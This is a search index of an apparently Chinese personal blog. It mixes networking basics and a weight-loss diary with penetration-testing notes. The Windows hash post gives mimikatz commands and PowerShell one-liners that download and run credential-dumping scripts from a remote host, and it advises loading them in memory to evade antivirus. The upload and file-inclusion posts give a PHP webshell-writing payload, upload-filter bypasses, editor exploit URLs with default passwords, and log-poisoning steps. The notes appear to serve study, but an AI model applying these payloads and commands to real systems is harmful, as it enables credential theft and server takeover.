<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[子网掩码]]></title>
    <url>%2F2019%2F08%2F16%2F%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81%2F</url>
    <content type="text"><![CDATA[子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩，它是一种用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分，即用于划分子网。 子网掩码是一个32位地址，用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在广域网上。子网掩码由连续的1和0组成，连续的1表示网络地址，连续的0表示主机地址，通过0的个数可以计算出子网的容量（子网中主机的IP地址范围）。 子网掩码的作用：子网掩码是在IPv4地址资源紧缺的背景下为了解决lP地址分配而产生的虚拟lP技术，通过子网掩码将A、B、C三类地址划分为若干子网，从而显著提高了IP地址的分配效率，有效解决了IP地址资源紧张的局面。另一方面，在企业内网中为了更好地管理网络，网管人员也利用子网掩码的作用，人为地将一个较大的企业内部网络划分为更多个小规模的子网，再利用三层交换机的路由功能实现子网互联，从而有效解决了网络广播风暴和网络病毒等诸多网络管理方面的问题。 举个实例：255.255.255.252当然上面是默认的情况，也是最简单的情况。下面我们分析子网掩码255.255.255.252是怎么划分子网的。将该子网掩码转换成二进制为30个1和2个0，表示每个子网中只有4个IP地址（2的2次方），192.168.1.0-255的地址段共可划分64个子网，第一个子网的地址范围是192.168.1.0-192.168.1.3，第二个子网的地址范围是192.168.1.4-192.168.1.7，依次类推。其中每个子网第一个和最后一个IP地址不可用（第一个作为网段地址，第二个作为广播地址），可用的只有2个IP地址。也就是说：如果子网掩码设置为255.255.255.252，那么该子网只能容纳两台电脑，而且这两台电脑的IP必须在一个子网内才能正常联网，例如一台电脑的IP设为192.168.1.10，另外一台电脑的IP必须设置为192.168.1.9。 子网划分实战 通过以上两个例子读者应该明白子网掩码的作用了，下面通过一个实际的例子检验刚才的学习成果。某个小型公司有四个部门：行政、研发、营销、售后，每个部门各40台计算机接入公司局域网交换机，如果要在192.168.1.0网段为每个部门划分子网，子网掩码应该怎么设置，每个子网的地址范围分别是什么？ 192.168.1.0网段共256个地址，划分4个子网，每个子网需要64个地址；64是2的6次方，子网掩码应该以6个0结尾，剩下的用1补齐，由26个1和6个0组成，转换成十进制是255.255.255.192；每个子网共64个IP地址，掐头去尾后可用地址只有62个，第1个子网的可用IP地址范围是：192.168.1.1-62，第2个子网可用IP地址范围是192.168.1.65-126，第3个子网的可用IP地址范围是：192.168.1.129-190，第4个子网可用IP地址范围是192.168.1.193-254；该公司各部门计算机按照3中的IP地址范围进行设置，所有计算机的子网掩码都必须设置为255.255.255.192，设置完毕后各部门内的计算机能正常联网，不同部门间的计算机无法直接联通。]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
      <tags>
        <tag>子网掩码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP地址分类]]></title>
    <url>%2F2019%2F08%2F16%2FIP%E5%9C%B0%E5%9D%80%E5%88%86%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[在TCP/IP协议族中，用于在IP层识别每一个连接到因特网设备的标识符称为因特网地址或IP地址（IP Address）。 IP地址由四段组成，每个字段是一个字节，8位，最大值是255，它唯一地定义了一台主机或路由器与因特网之间的一个连接。IP地址是全球唯一，且全球统一的。 IP地址由两部分组成，即网络地址和主机地址。网络地址表示其属于互联网的哪一个网络，主机地址表示其属于该网络中的哪一台主机。二者是主从关系。 IP地址分类IP地址被分为五类：A、B、C、D、EIP地址的二进制表示，比如：01110101 10010101 00011101 11101010IP地址的十进制表示，比如：129.11.11.39如何判断一个IP地址是属于哪一类？只需要看二进制表示的第一个八位，或者看十进制表示的第一段。 A类IP地址：(0.0.0.0 - 127.255.255.255)二进制表示的第一个八位的最高位不能为1，即00000000 ~ 01111111，十进制的取值范围为0~127A类IP地址由1字节的网络地址（地址块）和3字节的主机地址组成。A类IP地址中，网络标识的长度为7位（因为网络地址的最高位必须为0），主机标识的长度为24位。A类IP地址共有128个地址块，可以被指派给128个机构组织，但是这类地址的每一个地址块都包含有1600多万（16777216）个地址，这表明要使用这些地址块的机构应该是个非常庞大的机构。 B类IP地址：(128.0.0.0 - 191.255.255.255)二进制表示的第一个八位的取值范围为10000000 ~ 10111111，十进制的取值范围为128~191B类IP地址由2字节的网络地址和2字节的主机地址组成。B类IP地址中，网络标识的长度为14位（因为网络地址的最高位必须为10），主机标识长度为16位。B类IP地址共有2^14=16384个地址块，可指派给16384个机构组织，这类地址的每一个地址块都包含6万多（65535）个地址，要使用这么多地址的机构也不多见。 C类IP地址：(192.0.0.0 - 223.255.255.255)二进制表示的第一个八位的取值范围为11000000 ~ 11011111，十进制的取值范围为192~223C类IP地址由3字节的网络地址和1字节的主机地址组成。C类IP地址中，网络标识的长度为21位（因为网络地址的最高位必须为110），主机标识长度为8位。C类IP地址共有2^21=2097152个地址块，可指派给2097152个机构组织，这类地址的每一个地址块仅包含256个地址，256这个数字太小，小到一个C类地址块就能满足的机构也不多见。 D类IP地址：(224.0.0.0 - 239.255.255.255)二进制表示的第一个八位的取值范围为11100000 ~ 11101111，十进制的取值范围为224~239D类IP地址只有1个地址块，该类中的每一个地址都被用来定义因特网上的一组主机。D类IP地址用来进行多播（多点广播）,即一对多通信。 E类IP地址：(240.0.0.0 - 247.255.255.255)二进制表示的第一个八位的取值范围为11110000 ~ 11111111，十进制的取值范围为240~255E类IP地址只有一个地址块。它被设计为保留地址。 特殊的IP地址：D类IP地址和E类IP地址属于特殊的IP地址。0.0.0.0对应于当前主机255.255.255.255是当前子网的广播地址所有网络号为127的地址都称之为回路地址（回环地址），回路地址！= 127.0.0.1，它们是包含关系，即回路地址包含127.0.0.1。实际上只要是127.0.0.1到127.255.255.255都是回环地址，都是可以PING检查的。ping 127.0.0.1，如果能ping通，说明TCP/IP协议栈没问题，如果有问题，就需要检查TCP/IP协议栈，或者重新安装它。 内网保留地址Internet设计者保留了IPv4地址空间的一部份供专用地址使用,专用地址空间中的IPv4地址叫专用地址,这些地址永远不会被当做公用地址来分配,所以专用地址永远不会与公用地址重复.IPv4专用地址如下：IP等级 IP位置Class A 10.0.0.0 - 10.255.255.255默认子网掩码:255.0.0.0Class B 172.16.0.0 - 172.31.255.255默认子网掩码:255.240.0.0Class C 192.168.0.0 - 192.168.255.255默认子网掩码:255.255.0.0 内网是可以上网的.内网需要一台服务器或路由器做网关,通过它来上网做网关的服务器有一个网关（服务器/路由器）的IP地址,其它内网电脑的IP可根据它来随意设置,前提是IP前三个数要跟它一样,第四个可从0-255中任选但要跟服务器的IP不同]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
      <tags>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下抓取hash的几种方式]]></title>
    <url>%2F2019%2F08%2F15%2FWindows%E4%B8%8B%E6%8A%93%E5%8F%96hash%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[在渗透测试过程中，对于windows系统的机器渗透需要注意hash的获取，其中hash分为LM-HASH与NTLM-HASH，在windows系统中，hash的默认存储位置为： C:\Windows\System32\config\SAM 各种工具： mimikatzprivilege::debugsekurlsa::logonPasswords wcewce.exe QuarkPwDumpQuarkPwDump.exe -dhl powershell脚本：使用powersploit中的mimikatz.ps1mimikatz在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Dumpcreds&quot;本地加载：powershell -exec bypass &quot;import-module Invoke-Mimikatz.ps1;Invoke-Mimikatz -Dumpcreds&quot; Ninja-copy在线加载：powershell -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://ip/Invoke-NinjaCopy.ps1&#39;);Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\SAM.txt;&quot;本地加载：powershell -exec bypass &quot;Import-Module .\Invoke-NinjaCopy.ps1;Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive&quot; 后记：为防止防火墙，杀软等工具杀掉ps1脚本，推荐使用在线加载的方式，文件不落地。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[减肥史]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%87%8F%E8%82%A5%E5%8F%B2%2F</url>
    <content type="text"><![CDATA[开始努力减肥~控制饮食，少吃油炸烧烤，尽量多运动 2019.08.12 星期一 早晨测量体重：87.6KG2019.08.13 星期二 早晨测量体重：87.4KG2019.08.14 星期三 早晨测量体重：87.7KG 。。。今天又吃的比较多。。估计明天体重会更重。。明天一定要更加油努力减肥了！！！2019.08.15 星期四 早晨测量体重：87.5KG2019.08.16 星期五 早晨测量体重：87.0KG]]></content>
      <categories>
        <category>私人生活</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSSQL三张特殊的系统表]]></title>
    <url>%2F2019%2F08%2F12%2FMSSQL%E4%B8%89%E5%BC%A0%E7%89%B9%E6%AE%8A%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[在进行microsoft sql server 数据库操作的时候，经常会有以下的疑问 ​ ① msql 中一共有多少的数据库？ ​ ② 如何判断数据库是否存在（不存在就创建，存在就不创建）？ ​ ③ 数据库中有哪些表？ ​ ④ 如何判断数据库中是否存在某张表？ ​ ⑤ 如何查看一张表一共创建了多少个字段？ ​ ⑥ 如何判断这个字段是否存在？ ​ 等，这些问题的解决需要使用到mssql数据库中提供的三张特殊的表 1.sysdatabases ：管理已经存在的数据库；(1)查看mssql中所有的数据库：SELECT * from sysdatabases (2)判断某个数据库是否存在：SELECT * from sysdatabases where name = ‘moviesite’; (3)统计数据库的总数：SELECT COUNT(*) as 数据库总数 from sysdatabases; 2.sysobjects：管理已经存在的表；(1)查看数据库中所有的表格：select * from sysobjects; (2)查看用户自己创建的所有的表格：select * from sysobjectswhere type = ‘U’; (3)判断某个表格是否存在：select * from sysobjectswhere name = ‘movie’; (4)统计表格总数：select COUNT(*) 表格总数 from sysobjects; 3.syscolumns：管理表中字段；(1)查看数据库中所有的字段：select * from syscolumns; (2)查看某张表中所有的字段：select * from syscolumns where id = OBJECT_ID(‘movie’); (3)查看某一字段是否存在：select * from syscolumns where id = OBJECT_ID(‘movie’) and name = ‘type’;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>MSSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列化反序列化漏洞]]></title>
    <url>%2F2019%2F08%2F12%2F%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F08%2F11%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[三种常见中间件的解析漏洞（IIS,apache,nginx）文件解析漏洞：一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞。 1.IIS解析漏洞IIS常见版本6.0 一般windows server 20037.0/7.5 一般windows server 20088.0/8.5 一般windows server 201210.0 一般windows server 2016 IIS5.X/6.0解析漏洞（两种利用方法）1.目录解析 /xx.asp/xx.jpg在网站下建立文件夹名字为.asp .asa的文件夹，其目录内的任何扩展名的文件都被IIS当成asp文件来解析执行。目录解析一般是配合编辑器进行使用，如ckfinder, fck 2.文件解析 ly.asp;.jpg在IIS6.0下，服务器默认不解析分号后面的内容，因此该文件被当作asp文件解析。IIS6.0下默认的可执行文件除了asp还包含asa,cer,cdxAsa在IIS7.0，7.5也可以。Cer在7.0下有的可以有的不行。 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞在Fast-CGI开启状态下，可以上传一个例如ly.jpg，内容为 1&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt; 的文件。然后访问ly.jpg/.php，在这个目录下就会生成一句话木马shell.php注意：只要是IIS的支持PHP的都可以在图片后面加/.php看是否能运行。Iis7.5 /10.0都可能会被执行。这个漏洞准确的说不是中间件的漏洞，而是PHP的解析漏洞。 2.Apache解析漏洞x.php.zz x.php.apache是从右往左开始判断解析，如果为不可识别解析，就再往左判断。比如x.php.zz，因为后缀是”.zz”不可被apache识别解析，所以会再往左解析，将该文件解析为x.php htaccess文件解析漏洞如果在Apache中.htaccess可被执行，且可以被上传，那可以尝试在.htaccess中写入： 1&lt;FilesMatch “x.jpx”&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ,然后再上传shell.jpx的木马，这样shell.jpx就可以解析为php文件。注意：如果上面后缀名是jpg，那么网页所有的jpg图片都会被当作php解析，会导致原有图片出错。 3.Nginx解析漏洞(Nginx在高并发上性能优于Apache很多) Nginx&lt;8.03空子节代码执行漏洞Nginx在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码。这种会很容易报错，但在burp抓包改包的时候可以这样写一下。Get方式提交自动截断，post方式提交手动截断，在抓包中把%00全选，ctr+shift+u手动截断。 IIS7.0/IIS7.5/Nginx&lt;8.03畸形解析漏洞在Fast-CGI开启状态下，可以上传一个例如ly.jpg，内容为 1&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt; 的文件。然后访问ly.jpg/.php，在这个目录下就会生成一句话木马shell.php 文件上传绕过技巧服务器命名规则第一种类型：上传文件名和服务器命名一致第二种类型：上传文件名和服务器命名不一致（随机，时间日期命名等）常见的上传检测方式1.客户端javascript检测（通常为检测文件扩展名）一、首先判断是否为JS本地验证如果浏览器页面没有刷新或者打开burp抓包没有抓到包就已经有验证结果即可证明为前端JS本地验证。 二、绕过方法(1).先上传符合要求的文件名如xx.jpg,再用burp抓包改包改成xx.php(2).使用firebug等直接删除掉本地验证的JS代码，如删除点提交点击事件触发的验证函数代码。(3).将PHP等需要用到的后缀名添加到JS验证的白名单中2.服务端MIME类型检测（检测Content-Type内容）一、MIME的作用和定义目录：使客户端软件，区分不同种类的数据，例如WEB浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。WEB服务器使用MIME来说明发送数据的种类，WEB客户端使用MIME来说明希望接收到的数据种类。Tomcat的安装目录\conf\web.xml中定义了大量的MIME类型。Apache的安装目录\conf\mime.types中定义了大量的MIME类型，httpd.conf中也定义了一些特殊的MIME类型。 二、绕过方法：例：burp抓包后修改Content-Type:image/gif 3.服务端目录路径检测（检测跟path参数相关的内容）目录路径检测，一般就检测路径是否合法。补充：韩国很多的网站对脚本没有做限制，不改名，也不限制类型，但是规定好了上传目录的权限，如只有读权限没有执行权限。如果上传的文件没有被改名，可以在文件名前面加../的方式跳出指定目录。往往上一层目录就有执行权限了。Filepath路径修改绕过(burp抓包后发到repeater中修改)可以用来突破自动命名规则xxxxx.gif一、改变文件上传后的路径/a.asp/ 需要一定的创建权限，成功城建后为/a.asp/xxxxx.gif二、直接改变文件名称/a.asp;. 修改后为/a.asp;.xxxxx.gif 4.服务端文件扩展名检测（检测跟文件extension相关的内容）黑名单检测——安全性比白名单低很多，攻击手法也比白名单多。绕过方式：（1）文件名大小写绕过例如AsP,pHp（2）名单列表绕过用名单列表里没有的名单进行攻击，比如黑名单里没有asa或cer之类。也可以把安全狗不允许的上传后缀名单复制到txt文件中，用burp爆破就可以知道哪些后缀可以被上传。（3）特殊文件名绕过比如发送的http包里把文件名改成test.asp.或test.asp_(下划线为空格)，这种命名方式在windows系统里是不被允许的，所以需要在burp进行修改，然后绕过验证后，会被windows系统自动去掉后面的.和空格，但要注意unix/linux系统没有这个特性。（4）0x00截断绕过目前只遇到过asp的程序有这种漏洞，给个简单的伪代码name=getname(http request)//假如这时候获取到的文件名是test.asp .jpg(asp后面为0x00) ,type=gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg, if(type==jpg)(5) .htaccess文件攻击配合名单列表绕过。上传一个自定义的.htaccess(6) 解析调用/漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞 白名单检测——相对难过很多，但是也不一定绝对安全。绕过方式：（1）0x00截断绕过用像test.asp%00.jpg的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击。 00截断0x00，%00，/00之类的截断，都是一样的，只是不同表示而已在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制在需要截断的位置添加了一个空格，空格是为了占位，方便修改00。然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00即可。 （2）解析调用/漏洞绕过 这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞.htaccess文件攻击，通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含“haha”这个字符串的任意文件，所以无论文件名是什么样子，只要包含“haha”这个字符串，都可以被以php的方式来解析。建一个.htaccess文件，里面的内容如下&lt;FilesMatch “haha”&gt;SetHandler application/x-httpd-php 双文件上传 （老的asp的站如南方，良精，动易……都可能存在双文件上传） 5.服务端文件内容检测（检测内容是否合法或含有恶意代码）如果文件内容检测设置的比较严格，那么上传攻击将变得非常困难，也可以说它是再代码层检测的最后一道关卡，如果它被突破了，就算没有代码层的漏洞，也给后面利用应用层的解析漏洞带来了机会。一般用图片马，有waf要求一句话代码能过waf。绕过二次渲染：1.攻击函数本身，通过上传不完整图片让其渲染函数暴露，然后攻击之。2.对文件加载器进行溢出攻击。怎么看是否被二次渲染：上传一张图片马 ，下载到本地，打开看看如果代码还在就没有被二次渲染。 常见编辑器漏洞动态的网站后台基本都是有编辑器的，主要利用编辑器的上传按钮辅助拿shell。编辑器因为有一个技术团队维护，所以安全性比很多网站自带的上传按钮高很多，主要是配合解析漏洞来突破。总体流程：先找编辑器后台或目录，确定编辑器种类和版本，然后百度找对应版本的漏洞利用，一般是配合解析漏洞。 编辑器利用1.查找编辑器目录（1）目录扫描注意目录的递归扫描一些重点目录：editoreditfckeditorewebeditoradmin/editorupload.aspupfile.aspup.html （2）目录遍历AwvsCaidaoBurpsuite （3）蜘蛛爬行爬行可以很容易的爬到图片上传等目录，然后可以通过图片上传目录的路径判断编辑器类型。Ewebeditor通常上传图片目录：Uploadfiles/2019092512321313131.jpg (以时间戳命名) Fck通常上传图片目录Userfile/images/x.jpg （4）谷歌语法site: xxx.com inurl:editorinurl:fckeditorinurl:ewebeditor 2.漏洞利用百度相关编辑器漏洞利用 FCKeditor编辑器利用FCKeditor编辑器页面：FCKeditor/_samples/default.html查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/查看FCK版本：FCKeditor/_whatsnew.html查看FCK版本：/editor/dialog/fck_about.html爆物理路径php:/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php爆绝对路径aspx/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/aspx/connector.aspx爆路径：http:///editor/filemanager/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/JSP上传1/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorJSP上传2/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp目录浏览1/editor/filemanager/browser/default/browser.html?Type=File&amp;Connector=../../connectors/asp/connector.asp目录浏览2/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp目录浏览3/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2FAsp创文件夹1/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/qing.asp&amp;NewFolderName=x.aspAsp创文件夹2/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z&amp;uuid=1244789975684Asp创文件夹3/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp”上传页面1/editor/filemanager/browser/default/connectors/test.html上传页面2/editor/filemanager/upload/test.html上传页面3/editor/filemanager/connectors/test.html上传页面4/editor/filemanager/connectors/uploadtest.html目录浏览3/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2FJoomla fck包含/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../../../../etc/passwd上传地址3：editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp Fck2.4.3如果是iis6.0可以利用编辑器的创建文件夹功能创建一个x.asp目录，然后在该目录下上传图片马，利用目录解析漏洞。也可以上传x.asp;.jpg，利用文件名解析漏洞。如果没有解析漏洞可以上传x.jpg，然后用burp抓包，在.后面加asp%00,然后%00截断。也可以配合之前学习的其他突破方式突破，如前端js,mime等。 Fck2.5遇到点变下划线，先创建x.asp,然后抓包，把第一行当前文件目录修改由根%2F变为%2Fxx.asp,这样只会把文件x.asp点变下划线，文件夹名字被保留。然后再利用解析漏洞上传图片马。 也可以利用二次上次，上传一个文件两次，因为文件名相同，可能会在后面加（1），有的时候代码不严谨，重名后代码没有再把点变下划线，不过这种能成功地概率很低。 Fck2.6高版本的，上传正常图片，抓包，在currentfolder=%2F加a,php%00，上传的时候%00会被自动截断，原来会把文件名放到%2F后面，现在会放到%00后面，然后被自动截断。遇到高版本的可以测试下，有的时候可以成功。 EWEBeditor编辑器利用ewebeditor/admin_style.aspewebeditor有独立登陆后台，因为登陆页面可能会被修改，可以登陆登陆后的页面样式页面，就会跳转到登陆页面。 ewebeditor/admin/login.asp 1.进后台弱口令：admin admin/ admin 123456/ admin123 admin888……下载默认数据库:ewebeditor/db/ewebeditor.mdb或ewebeditor/db/%23ewebeditor.mdbBurp抓包爆破利用注入点进行注入得到密码 2.修改上传类型/自己添加上传样式-添加上传按钮-上传在后台修改上传样式如果加入asp需要写aaspsp的形式，因为程序有代码把asp替换为空。通常可以加cer等。修改样式没有提交按钮，可以在页面hmtl编辑中自己手动添加一个提交按钮。也可以新建一个样式。 如果没有后台：（1）利用目录遍历漏洞，找网站数据库位置下载数据库，登陆网站后台拿shell（2）利用exp进行拿shell（3）构造上传 下载ewebeditor数据库，找到ewebeditor_style表，看看有没有可以上传脚本类型的样式，记住对应id，在网站随便找一个上传点，把id替换就可以上传了 其他类型编辑器的利用（1）ckfinder编辑器如果是iis6.0,找到编辑器目录，创建.asp子文件夹，用目录解析漏洞上传]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含及漏洞利用]]></title>
    <url>%2F2019%2F08%2F09%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[文件包含漏洞产生的原因：文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。 文件包含源码如下：123&lt;code&gt; if(@$_GET[&apos;file&apos;])&#123;include_once($_GET[&apos;file&apos;]);&#125; 文件包含漏洞的形成，需要满足两个条件：1.include()等函数通过动态变量的方式引入需要包含的文件2.用户能够控制这个动态变量文件包含漏洞的分类：1.本地文件包含(Loacl File Inclusion,LFI)url形如：http://127.0.0.1/fi/include1.php?file=phpinfo.php 2.远程文件包含(Remote File Inclusion,RFI)url形如：http://127.0.0.1/fi/include1.php?file=http://127.0.0.1/phpinfo.txt 所包含对象可以是任意文件，执行方式是将文件内容以php代码来执行 文件包含漏洞的危害：通过文件包含漏洞，可以读取系统中的敏感文件，源代码文件等，如密码文件，通过对密码文件进行暴力破解。若破解成功则可获取操作系统的用户账户，甚至可通过开放的远程连接服务进行连接控制。另外不管是本地文件包含还是远程文件包含，文件包含漏洞还可能导致执行任意代码。也可以读取本地的源代码进行分析进一步发现漏洞，或者通过构造特殊请求写入日志，然后包含日志文件，达到获取Webshell的目的。 本地文件包含：本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤，允许遍历目录的字符注入浏览器并执行。 首先，当值可以直接被控制时，你就会有一个非常类似的如下的代码片段： 12$ file = $ _GET [&apos;file&apos;];include ($ file); 如果你可以找到上面的代码，那么就有一个直接包含的$文件，你可以控制它。请注意：该文件可以是任何类型，无论它是被删除的文件类型、图片还是任意的内容，都包括在内。 通过目录遍历漏洞可以获取到系统中其他文件的内容： 常见的敏感信息路径：Windows系统c:\boot.ini // 查看系统版本 c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件 c:\windows\repair\sam // 存储Windows系统初次安装的密码 c:\ProgramFiles\mysql\my.ini // MySQL配置 c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码 c:\windows\php.ini // php 配置信息 Linux/Unix系统/etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 首先，在当前文件夹中创建任意后缀的任意文件，如：file.txt（即使是像file.jpg这样的图片格式，也会产生以下效果）。将文件的内容设置为：phpinfo (); 此时，文件包含漏洞还包含当前服务器中的其他文件，同时支持包含Web应用程序的目录，如下所示：尝试包括你的硬盘的一些内容，例如：C:\WINDOWS\system.ini。 如果你这样做，就可以在浏览器上看到任何文件的输出内容。这只有当你有完全控制和文件类型没有进一步指定时才有效。 那么，如果代码片段变成如下这样，你该怎么做？ 123$file = $_GET[&apos;file&apos;] . &apos;.php&apos;;echo $file;include($file); 在这种情况下，你可以尝试按照上面的方法：这将导致以下的输出： %00截断你可以看到，如果后缀是固定的，就像上图一样，你不会找到前面包含的文件。 所以这里有另一种方法：％00截断。这个技巧也被广泛应用于不同的领域 在PHP中使用％00：1.PHP版本&lt;5.3（不包括5.3）;2.PHP magic_quotes_gpc = off;3.PHP不会在收到的参数中使用addslashes函数，例如上面代码中的$ _GET [‘file’]，不过在PHP版本5.3或更高版本中，此问题已得到解决。2和3的原因是因为%00为NULL，NULL被魔术引号和addslashes转义。 如果打开gpc或者使用了加法器函数，序列将被正确地转义。首先，你可以尝试如果gpc打开会发生什么（效果与使用该函数相同）。 如果你启用了gpc标志，你可以直接看到这个过程是如何发生的。 接下来可以看看5.3版本中的情况： 这里也没有明显的效果。所以你可以看到，只要满足上述三个条件，就可以使用％00。 首先，你要将PHP版本更改为5.2，并在php.ini更改为magic_quotes_gpc = off.后重新启动Apache。这使你就能够在尝试时使用截断。 这时可以看到，你已经成功地使用了其中的截断。 那么文件只包含了包含的功能吗？当然不是，之所以会这样，是因为你可以控制可以包含的内容。你可以创建一个文件：shell.txt来进一步利用这个漏洞。 你可以看到，其中也包括了shell。那么两者有什么区别呢？其实没有什么区别，原理是一样的，但是第一个是用后缀来介绍的，第二个是固定在程序后缀后面的。但是可以使用％00，因为当程序流（program stream ）遇到％00终止符(terminator)时它会直接终止。 路径长度截断条件：windows OS，点号需要长于256；linux OS 长于4096 Windows下目录最大长度为256字节，超出的部分会被丢弃； Linux下目录最大长度为4096字节，超出的部分会被丢弃。 测试代码： 1234&lt;?php $filename = $_GET[&apos;filename&apos;]; include($filename . &quot;.html&quot;);?&gt; EXP: 1http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt点号截断条件：windows OS，点号需要长于256 测试代码： 1234&lt;?php $filename = $_GET[&apos;filename&apos;]; include($filename . &quot;.html&quot;);?&gt; EXP: 12http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt包含日志文件拿SHELLweb服务器，基本上把请求写入到他的日志文件中，有的是access.log，有的是error.log，所以，我们可以尝试，写一些奇怪的数据，例如，然后呢让访问出错，这个就会被记录到日志文件中去，然后，我们利用本地包含，去包含这个日志文件，相当于我们得到了一个shell。 可以在url里面写入shell数据，也可以在referer或者ua中写入，但是，这个写入尽量要使用抓包工具，例如burp来写入，因为浏览器，会给我们转码。造成包含不成功。 远程文件包含：远程文件包含就是允许攻击者包含一个远程的文件,一般是在远程服务器上预先设置好的脚本。 此漏洞是因为浏览器对用户的输入没有进行检查，导致不同程度的信息泄露、拒绝服务攻击 甚至在目标服务器上执行代码。 本地文件包含与远程文件有着相同的原理，但前者只能包含服务器上存在的文件，而后者可以包含远程服务器上的文件。 如果PHP的配置选项中，allow_url_include为ON的话，include和require这样的文件包含函数是可以加载远程文件的。远程文件漏洞，可以直接用来执行任意命令。 allow_url_include 是否允许引用URL文件allow_url_fopen 是否允许打开URL文件 在新版PHP中allow_url_fopen选项默认是打开的，allow_url_include默认是关闭的 